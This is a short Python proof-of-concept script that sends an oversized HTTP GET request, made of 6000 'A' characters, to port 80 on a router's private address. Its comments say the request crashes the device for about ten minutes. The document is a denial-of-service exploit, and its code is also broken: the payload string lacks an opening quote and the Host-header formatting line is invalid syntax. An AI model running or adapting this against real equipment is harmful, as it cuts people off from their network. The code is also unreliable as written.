#!/bin/python
import socket
import struct
 
# This will crash the router.
# In some devices it takes about 10 minutes until functionality is
restored.
 
buffer = "\x41" * 6000            # Original fuzzing buffer.
host = "10.0.0.138"
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 80))
 
payload = GET /" + buffer + " HTTP/1.1\r\n"
payload += ("Host: %s \r\n\r\n", % host)
 
s.send(payload)
s.close()
